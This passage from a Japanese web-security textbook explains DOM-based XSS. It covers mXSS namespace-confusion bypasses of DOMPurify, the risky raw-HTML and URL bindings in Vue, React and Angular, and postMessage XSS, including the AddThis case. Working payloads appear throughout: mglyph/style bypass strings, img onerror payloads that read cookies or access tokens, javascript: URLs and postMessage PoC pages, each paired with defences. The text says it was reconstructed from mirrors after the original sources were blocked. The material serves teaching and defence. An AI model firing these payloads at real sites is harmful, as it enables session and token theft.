- **SVG名前空間**：`<svg>` 配下。要素名の大文字小文字が区別され、`<style>` の扱いも異なる。
- **MathML名前空間**：`<math>` 配下（数式）。

**同じ要素名でも、属する名前空間が違えばパース規則が違う**——これが混同攻撃の土台です。しかも仕様には、名前空間をまたいで**HTMLの解析を再開させる“統合ポイント（integration point）”** が存在します。

- `<svg>` 内の `<foreignObject>`
- `<math>` 内の `<annotation-xml>`、および `<mtext>` `<mi>` `<mo>` `<mn>` `<ms>`（MathML text integration point）

これらの内側では「HTML名前空間として解析し直す」ため、**要素が名前空間の間を移動する**現象が起き、②で見た姿と④の姿がずれます。

攻撃者は、`<form>` の入れ子や `<mglyph>` のような要素を巧妙に配置して、**サニタイズ時（②）にはHTML名前空間で無害に見える要素を、再パース時（④）にMathML/SVG名前空間へ滑り込ませ**、その結果 `<style>` の中身がテキストではなくなり、隠していた `<img onerror>` が“本物の要素”として蘇るように仕込みます。

> 出典: Attack Classes & Bypass History — cure53/DOMPurify Wiki — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

#### 2.4 実際のバイパスとその対象バージョン（陳腐化への注意）

名前空間混同によるDOMPurify（cure53製の代表的なHTMLサニタイザ・ライブラリ。DOMベースで動く）のバイパスは、**歴史的に何度も発見され、その都度パッチされてきた**「イタチごっこ」です。学習上重要なのは、**どのペイロードがどのバージョンで塞がれたか**を明確に区別することです（古いバイパスは最新版では動きません）。

**① `<mglyph>` を用いた名前空間混同（Michał Bentkowski、2020年公開）**
`<form>` の入れ子と `<math><mtext>` を組み合わせ、本来HTML名前空間にある `<mglyph>` を再パース時にMathML名前空間の子へ移動させる古典的ゲーデット（gadget：攻撃の部品）。

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

**なぜ動くのか**：`<mtext>` はMathML text integration point なのでその内側はHTML扱い。ところが `</form>` によるツリーの所有権変更（ownership mutation）で、再パース時に `<mglyph>` の親が `<mtext>`（MathML名前空間）に切り替わる。すると `<style>` もMathML名前空間となり**中身がテキストとして扱われなくなる**。続く `</math>` でMathMLを抜け、`<img>` がHTML名前空間の“本物の要素”として生成されて `onerror` が発火する。→ **DOMPurify 2.0.17 で対策**（それ以前のバージョンが影響。securitum の解説記事のタイトルも「DOMPurify 2.0.17 bypass」）。

**② “From SVG and back”（Daniel Santos、2020〜2021年公開）**
SVG名前空間へ入り、統合ポイントを通じてHTML名前空間へ「戻る」経路を悪用する続編バイパス。→ **DOMPurify 2.2.2 で修正**（`< 2.2.2` が影響）。

**③ cure53 による包括的な名前空間検証の導入（PR #495、2020年12月マージ）**
上記の個別対応を根本から塞ぐため、`_checkValidNamespace` 関数が追加されました。対象ペイロードの例：

```html
<!-- 例1（2019年報告の古典）: svg配下にp が入り再パースで構造が変わる -->
<svg></p><style><a title="</style><img src onerror=alert(1)>">

<!-- 例2: form + math + mtext + mglyph の名前空間切り替え -->
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

修正内容の要点：
- SVG/MathMLとHTMLの間の名前空間切り替えは、**仕様が定める統合ポイント経由のみ許可**する。
- SVG固有・MathML固有の要素は、**それぞれの名前空間内にしか存在できない**と検証し、予期しない名前空間の要素は削除する。
- **`insertAdjacentHTML` の使用をやめ**、DOMノードを直接操作するよう変更。これはドキュメント解析モードとフラグメント解析モードの差異を突く再パース攻撃を防ぐため。
→ **DOMPurify 2.2.6 以降で有効**。

**④ 近年のCVE（arms raceは今も継続）**
cure53のWikiによれば、その後も新しい攻撃クラスが報告され続けています（Wikiが列挙する例）：

- **CVE-2024-47875 / CVE-2024-45801**：ネスト型mXSS。プロトタイプ汚染（prototype pollution：オブジェクトの共通の親 `Object.prototype` を書き換えて全オブジェクトの挙動を汚染する攻撃）がネスト深さチェックを弱め、これらが連鎖。3.1.1 系で数値の深さ上限を追加。
- **CVE-2026-47423**：`<selectedcontent>` 要素。ブラウザが**サニタイズ実行後に**選択中の `<option>` の内容を再複製するため、検査済み領域に危険なコンテンツが後から出現。3.4.5 で修正。
- **CVE-2026-41238**：プロトタイプ汚染によるサニタイザのダウングレード。3.4.0 で「プロトタイプなしオブジェクト初期化」により修正。
- Wikiは **3.4.15 時点で列挙した全攻撃クラスが塞がれている**としています。

**学習上の結論**：mXSS対策は「DOMPurifyを入れれば終わり」ではなく、**必ず最新版に追随し続ける**必要があります。バージョン依存の脆弱性は、対象バージョンと修正版・公開年をセットで理解しなければ意味がありません。

> 出典: Attack Classes & Bypass History — cure53/DOMPurify Wiki — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
> 出典: Harden protection against mutation XSS caused by namespace switching (PR #495) — cure53/DOMPurify — https://github.com/cure53/DOMPurify/pull/495
> 出典（さらに深く学ぶ資料）: mutation XSS via namespace confusion – DOMPurify 2.0.17 bypass（Michał Bentkowski, securitum）/ From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos, Medium）/ mXSS Attacks: Attacking well-secured Web-Applications（Heiderich ほか, cure53）— https://cure53.de/fp170.pdf

#### 2.5 DOMPurifyはどう塞ぐか — 防御機構の要点

現在のDOMPurifyがmXSS系を塞ぐために備える主な機構（Wikiより）：

- **名前空間検証**：各ノードを「タグ名」だけでなく**親の名前空間との整合性**で評価する（前項 `_checkValidNamespace`）。
- **`SAFE_FOR_XML` 正規表現**：属性値に潜む危険なシーケンス——コメント/CDATA風の閉じ列 `(--!?|])>` や、生テキスト要素の閉じタグ `</style|script|title|...>`——を検出して無害化。前述の「属性値に `</style>` を仕込むブレークアウト」対策。
- **キャッシュされたプロトタイプアクセッサ**：DOM clobbering（HTML要素に `id`/`name` を付けることで、JavaScriptから見た同名プロパティを要素で“上書き”してしまう攻撃）を防ぐため、セキュリティ関連プロパティへのアクセスをキャッシュした正規の参照経由に固定。

そして安全性の検証には、文字列一致だけでなく **「サニタイズ→シリアライズ→再挿入→再パース」の全ライフサイクルをテストし、実際にDOMへ挿入した後に `onerror` 属性や `<script>` が残っていないか**を確認することが必須、とされています。これはmXSSの本質（②と④の食い違い）から論理的に導かれる検証方針です。

> 出典: Attack Classes & Bypass History — cure53/DOMPurify Wiki — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

---

### 3. GMO Flatt Security「SPA開発とセキュリティ」— React / Vue / Angular のDOMベースXSS

#### 3.1 資料の位置づけと中心的主張

本資料（GMO Flatt Security、2022年4月公開）は、**SPA（Single Page Application：初回に読み込んだ1枚のHTML上で、以降はJavaScriptがDOMを書き換えて画面遷移する方式のWebアプリ）** におけるインジェクション、とりわけ **DOMベースXSSを引き起こす「危険なAPIの誤用」を、Vue・React・Angular の3大フレームワークごとに具体的に解説し、対策を示す**ものです。

中心的な主張は次の2点です。

1. **こうした脆弱性は自動スキャナで見つけにくい**：攻撃の成否がクライアント側JavaScriptのデータフロー（source→sink）に依存するため、サーバ応答だけを見る旧来の脆弱性スキャナでは検出困難で、**手作業のコードレビュー／診断が不可欠**。
2. **フレームワークの「自動エスケープ」は万能ではない**：現代のフレームワークは通常のテキスト表示を自動でエスケープ（HTMLとして特別な意味を持つ文字 `< > & " '` を `&lt;` 等に変換し、データをコードとして解釈させない処理）してくれる。この安心感が、**「エスケープの網から漏れる箇所」（後述の“抜け穴”API・URL属性）** の危険性を開発者に忘れさせる。ここに事故が集中する。

> 出典: SPA開発とセキュリティ — DOM based XSS を引き起こすインジェクションの Vue, React, Angular における解説と対策（GMO Flatt Security Blog）— https://blog.flatt.tech/entry/spa_injection

#### 3.2 3フレームワークに共通する「抜け穴」の型

各フレームワークの詳細に入る前に、共通の構図を押さえます。フレームワークは「テキストの自動エスケープ」で反射型XSS的な事故の大半を防ぎますが、**設計上どうしても“生のHTML/URLを扱う口”を用意せざるを得ず**、そこが sink になります。抜け穴は大きく2種類です。

| 抜け穴の型 | 何が危険か | 3FWでの現れ方 |
|---|---|---|
| **生HTMLの注入口**（自動エスケープを意図的に無効化するAPI） | 文字列をHTMLとして解釈しDOM化する。`<img onerror>` 等が生きる | Vue: `v-html` ／ React: `dangerouslySetInnerHTML` ／ Angular: `[innerHTML]` + `bypassSecurityTrustHtml` |
| **URL/属性への注入**（`href` `src` 等に文字列を流す） | `javascript:` スキームでクリック時にコード実行 | 3FW共通：動的な `href`/`:href`/属性バインド |

以下、フレームワークごとに具体化します。

#### 3.3 Vue

**既定の安全機構**：Vueはテキスト補間 `{{ userInput }}` と属性バインド `v-bind`（`:属性` 記法）で**自動的にエスケープ**します。したがって `{{ }}` に何を入れてもタグとしては解釈されず、通常の表示は安全です。

**抜け穴①：`v-html`（生HTMLの sink）**
`v-html` ディレクティブは、値を**エスケープせず生のHTMLとしてDOMに挿入**します。リッチテキスト表示・Markdownプレビュー・メールテンプレート描画などで多用され、事故が起きやすい代表格です。

```html
<!-- 危険: userHtml に攻撃者の値が入るとXSS -->
<div v-html="userHtml"></div>
```
攻撃者が `userHtml = "<img src=x onerror=alert(document.cookie)>"` を送り込めば発火します。
**なぜ動くのか**：`v-html` は内部的に `innerHTML` 相当の代入を行うため、第1節で見た `innerHTML` sink とまったく同じ理屈でイベントハンドラ属性が実行されます。

**抜け穴②：`:href`（`v-bind:href`）への `javascript:` URL**
属性バインドはテキストとしてはエスケープしますが、**「値が `javascript:` スキームか」は既定で検査しません**。

```html
<!-- 危険: userUrl = "javascript:alert(1)" だとクリックでコード実行 -->
<a :href="userUrl">プロフィール</a>
```
本資料は、ユーザーのリンク入力欄に `javascript:alert(1)` を入れると、クリック時にalertが出る具体例を挙げています。
**なぜ動くのか**：第1.5節の `setAttribute("href","javascript:...")` と同一の原理。属性バインドはHTMLエスケープはするがスキーム検証はしない。

**対策**：ユーザー制御の内容には `v-html` を避け `v-text`（＝自動エスケープ表示）を使う。どうしても生HTMLが必要ならDOMPurify等で**表示直前にサニタイズ**する。URLは**バックエンドで**スキームを許可リスト検証してから保存する（フロントだけでのURLサニタイズは信頼できない）。

> 出典: SPA開発とセキュリティ（GMO Flatt Security Blog）— https://blog.flatt.tech/entry/spa_injection
> 出典（補強）: Security | Vue.js 公式ガイド — https://vuejs.org/guide/best-practices/security

#### 3.4 React

**既定の安全機構**：JSX（React独自のHTML風構文）に埋め込んだ値 `{userInput}` は**自動的にエスケープ**されるため、通常の描画は安全です。

**抜け穴①：`dangerouslySetInnerHTML`（生HTMLの sink）**
その名（dangerously＝危険なことに）どおり、**自動エスケープを意図的にバイパスして生HTMLを挿入する**唯一の口です。

```jsx
// 危険: __html に攻撃者の値が入るとXSS
<div dangerouslySetInnerHTML={{ __html: userHtml }} />
```
ペイロード例：`{ __html: "<img src=x onerror='alert(localStorage.access_token)'>" }`
**なぜ動くのか**：内部的に `innerHTML` へ代入するため、`<img onerror>` が本物の要素として生成され発火。`localStorage` からアクセストークンを窃取する等、実害に直結します。

**抜け穴②：`href` への `javascript:` URL**
動的に生成する `<a>` の `href` を攻撃者が制御できると `javascript:` URLを注入できます。

```jsx
// 危険: url = "javascript:alert(1)"
<a href={url}>リンク</a>
```
（Reactは16.9以降、`javascript:` URLに対して**警告を出す**ようになりましたが、警告であって完全な遮断ではないバージョン・経路があり、依然として注意が必要です。）
**なぜ動くのか**：属性値の `javascript:` スキームがクリック時に評価される、第1.5節と同一原理。

**抜け穴③：`ref` 経由の直接DOM操作 / `eval`**
`useRef`/`ref` で取得した生のDOM要素に対し `ref.current.innerHTML = ...` のように直接書き込むと、Reactのエスケープを完全に迂回します。また `eval()` や `new Function()` にユーザー入力を渡すのも当然に危険です。

**対策**：ユーザー入力に `dangerouslySetInnerHTML` を使わない。必要ならDOMPurifyで**サニタイズしてから**渡す。URLは許可スキーム検証（フロントで完結させずバックエンドでも検証）。`ref` 直接操作・`eval` を避ける。

> 出典: SPA開発とセキュリティ（GMO Flatt Security Blog）— https://blog.flatt.tech/entry/spa_injection
> 出典（補強）: Exploiting Script Injection Flaws in ReactJS Apps（Bernhard Mueller, DailyJS/Medium）

#### 3.5 Angular

**既定の安全機構**：Angularは最も強力で、**DOMにバインドされる値をすべて“信頼できない”ものとして既定でサニタイズ**します。`[innerHTML]="userContent"` と書いても、Angularがまず**組み込みサニタイザ**を通し、`<script>` や `onerror` のような危険な要素・属性を除去してから描画します。

```html
<!-- Angularが自動サニタイズするので、これ自体は比較的安全 -->
<div [innerHTML]="userContent"></div>
```

**抜け穴：`DomSanitizer.bypassSecurityTrust...` の誤用**
Angularには、サニタイズを**意図的に無効化する“エスケープハッチ”** として `bypassSecurityTrustHtml()`（および `...Url` `...ResourceUrl` `...Script` `...Style`）があります。これに**ユーザー入力を渡すと、Angularの防御を自ら無力化**してXSSになります。

```typescript
// 危険: 信頼できない値に bypass を使うと自動サニタイズを無効化してXSS
this.trusted = this.sanitizer.bypassSecurityTrustHtml(userHtml);
```
```html
<div [innerHTML]="trusted"></div>
```
**なぜ動くのか**：`bypassSecurityTrust...` は「この値は自分が安全だと保証したので検査不要」という宣言。Angularはそれを信じてサニタイズをスキップし、生HTMLがそのまま `innerHTML` に到達する。

**正しい使い方の原則**（Angular公式・本資料に共通）：`bypassSecurityTrust...` は**自分が書いた静的な安全な文字列にのみ**使い、ユーザー入力には決して使わない。使う場合は**値の発生源にできるだけ近い場所で・早い段階で**呼び、安全性を目視で確認しやすくする。

**対策**：ユーザー入力は `[innerHTML]`（自動サニタイズ）に任せる、またはサーバ側HTMLサニタイザを使う。`bypassSecurityTrust...` を安易に使わない。加えて **Trusted Types**（後述）を有効化すると、ブラウザ自身が「承認済みポリシーを通した値しか危険な sink に代入できない」ことを強制でき、防御が一段強くなる。

> 出典: SPA開発とセキュリティ（GMO Flatt Security Blog）— https://blog.flatt.tech/entry/spa_injection
> 出典（補強）: Security • Angular 公式ガイド / DomSanitizer • Angular — https://angular.dev/best-practices/security

#### 3.6 3フレームワーク横断の防御まとめと多層防御

本資料が導く実務上の指針を統合すると次のとおりです。

1. **“抜け穴”APIを棚卸しする**：`v-html` / `dangerouslySetInnerHTML` / `[innerHTML]`＋`bypassSecurityTrust...` の全使用箇所を洗い出し、ユーザー入力が流れ込まないか監査する。
2. **生HTMLが必要なら表示直前にサニタイズ**：**DOMPurify**（最新版）でサニタイズしてから sink に渡す。第2節のとおりバージョン追随が必須。
3. **URLはスキームを許可リスト検証**：`javascript:` `data:` `vbscript:` を弾く。**フロントだけで完結させず、バックエンドで保存前に検証**する（「フロントでURLサニタイズが必要な時点で設計に問題がある」という指摘）。
4. **エスケープハッチはヘルパー関数に閉じ込め、名前で意図を明示**：`bypassSecurityTrust...` のような危険関数は、用途が一目で分かる名前のヘルパーに包み、誤用を防ぐ。
5. **多層防御（defense in depth）として CSP と Trusted Types**：
   - **CSP（Content Security Policy）**：HTTPレスポンスヘッダ等で「スクリプトをどこから読み込み・実行してよいか」をブラウザに宣言する仕組み。インラインスクリプトや外部スクリプトの実行を制限し、万一XSSが注入されても発火の敷居を上げる（ただし**サニタイズの代替ではなく上乗せ**）。
   - **Trusted Types**：`innerHTML` などの危険な sink に対し、「承認済みポリシーを通して生成した特別な型の値」しか代入できないよう**ブラウザ自身に強制**させる仕組み。DOMベースXSSの sink 到達そのものをブロックできる、現時点で最も強力な多層防御の一つ。

これらは「どれか一つ」ではなく**重ねて**用いることで、フレームワークの自動エスケープ（1層目）→ サニタイズ／スキーム検証（2層目）→ CSP／Trusted Types（3層目）という多段構えを作るのが要諦です。

> 出典: SPA開発とセキュリティ（GMO Flatt Security Blog）— https://blog.flatt.tech/entry/spa_injection

---

### 4. セクションのまとめ — 「サーバの外」で完結する攻撃と、その多層防御

本セクションで押さえるべき要点を凝縮します。

- **DOMベースXSSは source→sink のデータフロー問題**。特に `location.hash` 経由の攻撃は**サーバに届かない**ため、XSSフィルタ・アクセスログ・利用者の目のいずれからも隠れやすく、`history.pushState` で痕跡すら消せる（はせがわ資料の核心）。
- **HTML5以降の新機能（`postMessage`・SVG/MathML統合・`data:`/Blob URL）は、そのまま新しい source/sink になった**。「beyond HTML5」。
- その最難関が **mXSS（mutation XSS）**。サニタイザが見た②のツリーと、ブラウザが実行する④のツリーが**名前空間の切り替え・rawtextブレークアウト・深いネストのフラット化**で食い違うことで成立する。DOMPurifyへの名前空間混同バイパスは **2.0.17 / 2.2.2 / 2.2.6** で順次修正され、その後も CVE が続く**イタチごっこ**であり、**最新版への追随が絶対条件**。
- **SPAフレームワークの自動エスケープは通常のテキストしか守らない**。`v-html` / `dangerouslySetInnerHTML` / `[innerHTML]`＋`bypassSecurityTrustHtml` という**生HTMLの抜け穴**と、`javascript:` URL を通す**属性/URLの抜け穴**に事故が集中する（Flatt資料）。
- 防御は**多層**で：フレームワークの自動エスケープ → DOMPurifyによるサニタイズと**バックエンドでのURLスキーム検証** → **CSP / Trusted Types**。そして自動スキャナに頼り切らず、**source→sink を追う手作業のコードレビュー**が不可欠。

> 出典: JavaScript Security beyond HTML5（はせがわようすけ）— https://www.docswell.com/s/hasegawa/ZDWWWK-2022-03-14-212823
> 出典: SPA開発とセキュリティ — DOM based XSS を引き起こすインジェクションの Vue, React, Angular における解説と対策（GMO Flatt Security Blog）— https://blog.flatt.tech/entry/spa_injection
> 出典: cure53/DOMPurify Wiki（Attack Classes & Bypass History）/ PR #495 — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

---

## postMessage経由のDOM XSS

反射型XSS（サーバがユーザー入力をそのままHTMLに埋め込んで返してしまうタイプ）を卒業した学習者が次に必ずぶつかるのが、**クライアント側だけで完結するXSS**、すなわちDOMベースXSSです。その中でも `postMessage` を悪用するものは、次の三つの理由から現代のバグバウンティで極めて重要度が高い領域になっています。

1. **サーバのレスポンスを一切書き換えなくても成立する。** ペイロードは `event.data`（後述）というJavaScriptのオブジェクトとしてブラウザ内部を流れるため、WAF（Web Application Firewall。HTTPリクエスト/レスポンスを検査してXSS等をブロックする防御機構）やサーバ側フィルタの多くを素通りします。
2. **窓（ウィンドウ）やiframeをまたぐ「信頼境界」の設計ミスを突く。** 攻撃対象のサイトそのものではなく、そこに埋め込まれた広告・SNSシェアボタン・チャットウィジェット・OAuthポップアップなどの `postMessage` 実装が穴になることが多く、**第三者スクリプト（サードパーティスクリプト）経由で数百万サイトが一括で脆弱になる**という破壊力を持ちます（本節の実例で扱う AddThis はまさにこれです）。
3. **一見「ちゃんとチェックしている」コードでもバイパスできる。** `indexOf` や正規表現による中途半端なオリジン検証は、ブラウザやJavaScriptの言語仕様の挙動を突いて破れます。ここに、この教科書が最も価値を置く「なぜそうなるのか」の原理が詰まっています。

このセクションでは、まず `postMessage` API そのものの仕組みを土台から説明し、脆弱性の本質（どこで信頼境界が破れるのか）を明らかにします。次に AddThis の実例で「本物の被害」を体感し、その後にオリジン検証バイパスの各テクニックを**仕組みのレベルで**分解します。最後にプロトタイプ汚染やCSPと組み合わせた高度な連鎖、発見のワークフロー、そして正しい防御策までを一気通貫で扱います。

> ⚠️ **未取得の資料**: 本節が主資料とした3件のURL（YesWeHack / Detectify / Intigriti）は、いずれも実行環境のネットワーク送信プロキシ（egress proxy）によって直接取得がブロックされました（理由: EGRESS_BLOCKED）。そのため以下の本文は、各記事のミラー（GitHub上のHackTricksミラー、PayloadsAllTheThings 等）および複数の二次言及・検索スニペットから内容を再構成したものです。正確な原文・最新の記述は、以下の各URLからユーザーご自身で直接ご確認ください。
> - postMessage脆弱性入門: https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> - AddThis 100万サイトのpostMessage XSS: https://labs.detectify.com/writeups/postmessage-xss-on-a-million-sites/
> - postMessage脆弱性の高度な連鎖: https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-postmessage-vulnerabilities

（以下は、取得できなかった上記資料の内容を、ミラー・二次資料・一般的な専門知識に基づいて再構成・補足した解説です。原文の一字一句の再現ではない点にご留意ください。）

---

### postMessage APIの基礎 — なぜ「窓をまたぐ通信」が必要なのか

#### 出発点: 同一オリジンポリシー（Same-Origin Policy, SOP）

ブラウザには **同一オリジンポリシー（Same-Origin Policy。以下SOP。あるオリジンのページのスクリプトが、別オリジンのページの中身やDOMに勝手にアクセスするのを禁止するセキュリティの大原則）** があります。ここでいう **オリジン（origin）** とは「スキーム（http/https）＋ホスト名＋ポート番号」の三つ組のことで、この三つが完全に一致して初めて「同一オリジン」とみなされます。たとえば `https://example.com` と `https://sub.example.com` はホスト名が違うので別オリジン、`https://example.com` と `http://example.com` はスキームが違うので別オリジンです。

SOPがあるおかげで、悪意あるサイト `attacker.com` の中に開いた `bank.com` のiframeの中身を、`attacker.com` のスクリプトが読み取ることはできません。しかし現実のWebアプリは、**あえてオリジンをまたいで安全にデータをやり取りしたい**場面が山ほどあります。たとえば、

- 親ページと、その中に埋め込んだ別オリジンのiframe（決済ウィジェット、地図、SNSシェアボタン、動画プレイヤー）が連携したい
- OAuth認証で開いたポップアップ窓（`window.open` で開いた認可サーバの画面）が、認証完了を親ページに知らせたい
- 別ドメインのチャットウィジェットが、親ページに「新着メッセージあり」を通知したい

こうした「SOPの壁を越えた、意図的で安全な通信路」を提供するために用意されたのが `window.postMessage()` です。

#### 送信側の構文

送信は次の形で行います。

```javascript
targetWindow.postMessage(message, targetOrigin, [transfer]);
```

- **`targetWindow`**: メッセージの送り先となる別のウィンドウオブジェクト。`iframe.contentWindow`（埋め込みiframe）、`window.open(...)` の戻り値（開いたポップアップ）、`window.parent`（自分を埋め込んでいる親）、`window.opener`（自分を開いた元の窓）などを指します。
- **`message`**: 送るデータ。文字列でも、構造化クローンアルゴリズムでコピー可能なオブジェクト（配列・プレーンオブジェクトなど）でも渡せます。
- **`targetOrigin`**: **「このオリジンのウィンドウにしか配達するな」という指定。** ここに `'https://trusted.example.com'` のように具体的オリジンを書くと、受信側の現在のオリジンがそれと一致したときだけメッセージが届きます。`'*'`（ワイルドカード）を書くと**任意のオリジンに配達される**ため、後述するとおり情報漏洩の温床になります。

例:

```javascript
// iframe に送る
document.getElementById('child').contentWindow.postMessage(
  { type: 'update', value: 42 },
  'https://widget.example.com'   // 具体オリジン指定（推奨）
);

// ポップアップに送る
const win = window.open('https://auth.example.com/login');
setTimeout(() => win.postMessage('ready', '*'), 2000); // '*' は危険
```

#### 受信側の構文 — ここに脆弱性が宿る

受信側は `message` イベントを購読（リッスン）します。

```javascript
window.addEventListener("message", (event) => {
  // event.origin : メッセージの「送信元オリジン」。ブラウザが自動でセットするため偽装できない
  // event.data   : 送られてきたデータ本体（taint source = 汚染源）
  // event.source : 送ってきたウィンドウオブジェクトへの参照
  if (event.origin !== "https://trusted.example.com") return; // オリジン検証
  console.log(event.data);
}, false);
```

ここで押さえるべき三つのプロパティが、そのまま攻防の焦点になります。

- **`event.origin`**: メッセージを送ってきた窓のオリジン。**この値は送信側のJavaScriptからは改竄できず、ブラウザが真実の値を入れてくれます。** だからこそ「本当に信頼できる相手からのメッセージか」を判定する唯一の確実な材料であり、これを**チェックし忘れる／甘くチェックする**ことがpostMessage XSSのほぼ全ての根本原因です。
- **`event.data`**: 送られてきたデータ。攻撃者が完全にコントロールできる **taint source（汚染源。ユーザー/攻撃者が制御でき、これがそのまま危険な処理に流れ込むとXSSになる入力の源泉）** です。
- **`event.source`**: 送ってきたウィンドウへの参照。「返信」に使えるほか、送信元の同一性チェックに使われることがあります（これも後述のとおりバイパス可能）。

> 出典: postMessage脆弱性入門（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> 出典: PostMessage Vulnerabilities（HackTricks、Intigriti記事のミラー的資料） — https://hacktricks.wiki/en/pentesting-web/postmessage-vulnerabilities/index.html

---

### 脆弱性の本質 — 二つの信頼境界が破れる

postMessageのセキュリティは「送信側」と「受信側」の二つの信頼境界からなり、それぞれ別種の脆弱性を生みます。

#### 受信側の欠陥（DOM XSSの主因）: オリジン検証の欠如

受信側の `message` ハンドラが `event.origin` を検証しないと、**世界中のどのサイトからでも** そのハンドラを起動できます。攻撃者は自分の用意したページ（`attacker.com`）に被害サイトをiframeで読み込むか、`window.open` で開き、そこへ任意の `event.data` を送りつけられます。

このとき `event.data` が **sink（シンク。ユーザー入力が最終的に実行・解釈されてしまう危険な代入先・実行点。DOM XSSの「着弾点」）** に無防備に流れ込むと、DOMベースXSSが成立します。代表的なsinkは次のとおりです。

- `element.innerHTML = event.data;` — 文字列がHTMLとしてパースされ、`<img src=x onerror=...>` などのイベントハンドラが発火
- `eval(event.data)` / `Function(event.data)()` / `setTimeout(event.data)` — 文字列がJavaScriptとして実行される
- `document.write(event.data)` — 文書ストリームにHTMLとして書き込まれる
- `location = event.data` / `location.href = event.data` — `javascript:` スキームを入れるとスクリプト実行
- `element.setAttribute('src', event.data)` を `<script>` や `<iframe>` に対して行う、`jQuery(event.data)` に渡す、など

最小限の脆弱なコードは次の通りです。

```javascript
// 脆弱: origin検証が一切ない
window.addEventListener("message", function (event) {
    document.body.innerHTML = event.data;  // sink = innerHTML
});
```

これに対する攻撃ページ（PoC）は次のようになります。

```html
<!-- attacker.com/exploit.html -->
<iframe src="https://victim.com/page-with-listener"
        onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')">
</iframe>
```

**なぜ動くのか**: iframeの `onload` で被害ページのロード完了を待ち、`contentWindow.postMessage(...)` で被害ページ内のリスナーへ文字列を送り込みます。被害ページはオリジンを確認しないため攻撃者からのメッセージを受理し、`innerHTML` に代入します。ブラウザのHTMLパーサはこの文字列を要素として解釈し、`<img>` の画像読み込みに失敗した瞬間 `onerror` 属性のJavaScriptを**被害ページのオリジン `victim.com` の権限で**実行します。`alert(document.domain)` が `victim.com` を表示すれば、攻撃者のスクリプトが被害オリジンで動いた＝XSS成立、という証明になります。送信側の `targetOrigin` に `'*'` を使っているのは、攻撃者は被害ページの正確なオリジンさえ書けば良く、`'*'` でも問題なく届くからです。

> 出典: postMessage脆弱性入門（YesWeHack） — https://www.yeswehack.com/learn-bug-bounty/introduction-postmessage-vulnerabilities
> 出典: Post Message XSS（HowToHunt, KathanP19、二次資料） — https://github.com/KathanP19/HowToHunt/blob/master/XSS/post_message_xss.md

YesWeHackの入門記事では、これをより現実的な題材で説明しています。あるゲーム風のデモページ（`rewards.html` と `start.html`）で、ユーザーが「Play」ボタンを押すと `pop1()` という関数が呼ばれ、`postMessage` で別ページへイベントが飛びます。受信側は「メッセージは自分のドメイン（例: `127.0.0.1`）から届くはずだ」と暗黙に前提しているのに、**送信元オリジンを検証していない**ため、攻撃者は同じ形のコードを自分のドメインに置き、`message` の中身を悪意あるJavaScriptペイロードに差し替えて送り込めば、被害ページ側でそれが処理されてしまう——という筋書きです。ポイントは「HTML5のpostMessageは `Event.data` を新たなtaint sourceとして持ち込む。これが安全でない形で扱われた瞬間にDOMベースXSSが発生する」という一般則です。

#### 送信側の欠陥: ワイルドカード `targetOrigin='*'` による情報漏洩

受信側だけでなく送信側にも罠があります。`postMessage(secret, '*')` のように `targetOrigin` を `'*'` にすると、**メッセージは配達先ウィンドウの現在のオリジンが何であっても配達されます。** つまり、攻撃者が被害ページを乗っ取って（あるいはiframeのlocationを差し替えて）配達先のオリジンを攻撃者オリジンに変えられる状況では、本来秘密であるはずのデータ（認証トークン、ユーザー情報など）が攻撃者に流出します。

PayloadsAllTheThings に載っている典型的なPoCは、この「送信側の緩さ」と「受信側でJSスキームがsinkに流れる」ことを組み合わせています。

```html
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>
<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://10.10.10.10/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')"
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

**なぜ動くのか**: 攻撃ページが被害アプリを `window.open` で開き、2秒待ってから `postMessage` で `{sender:"accounts", url:"javascript:confirm('XSS')"}` を送ります。被害アプリのリスナーが「`sender` が `accounts` なら `url` を信頼してリダイレクトに使う」ような実装で、しかも `location = msg.url` のようにsinkへ流していると、`javascript:` スキームのURLがナビゲーションとして評価され、被害オリジンでJavaScriptが走ります。ここでも受信側がオリジンを検証していないことが前提です。

> 出典: PayloadsAllTheThings — XSS Injection（swisskyrepo、二次資料） — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

#### 安全なコードとの対比

上記の脆弱例に対して、最低限守るべき安全形は次の通りです（詳細は本節末尾の防御策で展開します）。

```javascript
window.addEventListener("message", (event) => {
  // 1) 送信元オリジンを「完全一致」で許可リスト照合する
  if (event.origin !== "https://trusted.example.com") return;
  // 2) データの「形」を検証する（型・キー・値の範囲）
  let data;
  try { data = JSON.parse(event.data); } catch { return; }
  if (typeof data !== "object" || data.type !== "update") return;
  // 3) 危険なsinkには渡さない（innerHTML/eval等を避け、textContent等を使う）
  document.getElementById("status").textContent = String(data.value);
});
```

---

### 実例: AddThis 経由で100万サイトに影響した postMessage XSS

ここまでの原理が「机上の空論ではない」ことを、Detectify Labs の Mathias Karlsson が2016年12月15日に公開した実例で確認します。

#### 何が起きたか

**AddThis** は、ブログや記事の末尾によくある「SNSシェアボタン」を提供する第三者ウィジェットで、当時**100万を超えるサイト**に埋め込まれていました。AddThisのスクリプトを読み込んでいたそれら全サイトが、一斉に **DOMベースXSSに対して脆弱**だった、というのがこの事例の衝撃です。攻撃者はAddThisを使っている任意のページに、自分の好きなスクリプトを差し込めました。

#### 脆弱性の核心: 甘すぎるオリジン検証

AddThisの `postMessage` リスナーは、**送信元オリジンについて「HTTP/HTTPSのページであること」しか確認していませんでした。** つまり `event.origin` が `http://` か `https://` で始まりさえすれば、どのドメインからのメッセージでも受理してしまう——これは事実上「誰でもOK」に等しい、名ばかりの検証です。攻撃者のサイトも当然HTTPSで配信されるからです。

